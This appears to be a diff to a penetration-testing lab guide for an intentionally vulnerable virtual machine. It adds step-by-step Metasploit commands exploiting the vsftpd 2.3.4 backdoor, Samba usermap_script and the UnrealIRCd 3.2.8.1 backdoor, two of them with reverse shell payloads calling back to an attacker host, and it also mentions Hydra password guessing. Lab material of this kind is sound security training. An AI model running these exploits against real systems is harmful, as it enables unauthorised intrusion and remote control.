@@ -176,6 +176,36 @@ failed" \
 8. Observe valid credentials when Hydra reports [80][http-post-form] host: ...
 login: ... password: ....
 
+3.1 Exploit 1 — VSFTPD 2.3.4 backdoor (bind shell)
+When to use: nmap shows vsftpd 2.3.4.
+1. Inside msfconsole:
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.106
+set RPORT 21
+show options
+run
+
+3.2 Exploit 2 — Samba usermap_script (RCE)
+When to use: nmap shows Samba 3.0.20 (vulnerable).
+1. In msfconsole:
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.106
+set RPORT 139
+show options
+set PAYLOAD cmd/unix/reverse_netcat
+set LHOST 192.168.56.104
+set LPORT 4444
+exploit
+
+3.3 Exploit 3 — UnrealIRCd 3.2.8.1 backdoor
+When to use: nmap shows 6667/tcp UnrealIRCd 3.2.8.1.
+Use module:use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.56.106
+set RPORT 6667
+set PAYLOAD cmd/unix/reverse_perl set LHOST 192.168.56.104
+set LPORT 4444
+exploit
+
 3.4 Exploit 4 — Tomcat manager: credential scan + WAR
 upload (if Tomcat present)
 When to use: nmap shows Tomcat (8180 or 8080) and manager application reachable.
